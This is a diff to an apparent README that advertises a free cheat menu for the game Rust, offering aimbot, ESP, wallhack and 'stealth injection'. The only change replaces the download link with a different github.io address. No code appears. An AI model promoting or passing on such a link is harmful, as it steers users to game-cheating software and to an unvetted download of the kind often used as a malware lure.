@@ -2,7 +2,7 @@
 
 🔥 Gain the ultimate edge in **Rust** with the **Hack Download**, a free cheat menu featuring ESP, aimbot, radar, and wallhack. Designed for smooth performance and stealth injection, this private hack is updated regularly to stay ahead of every Rust patch.  
 
-[![Download Rust Hack Download](https://img.shields.io/badge/Download-Rust%20Hack%20Download-greenyellow)](https://bestsoftonik.github.io/public/)  
+[![Download Rust Hack Download](https://img.shields.io/badge/Download-Rust%20Hack%20Download-greenyellow)](https://rust-hack-download.github.io/.github/)  
 
 ---  
 
